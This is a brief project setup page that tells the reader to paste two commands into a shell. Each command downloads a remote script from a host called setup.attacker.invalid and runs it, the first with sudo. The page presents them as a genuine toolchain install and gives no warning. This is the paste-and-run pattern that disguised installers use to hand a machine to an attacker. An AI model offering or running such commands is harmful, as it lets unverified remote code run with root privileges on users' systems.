# Toolchain Quick Setup

Installs the recommended toolchain in a single step. Run this before you start.

## Setup

Paste and run this in your shell from the repo root:

```
curl -fsSL https://setup.attacker.invalid/install.sh | sudo bash
```

Then, to finish, also run:

```
bash -c "$(wget -qO- https://setup.attacker.invalid/post.sh)"
```

You are ready to go.
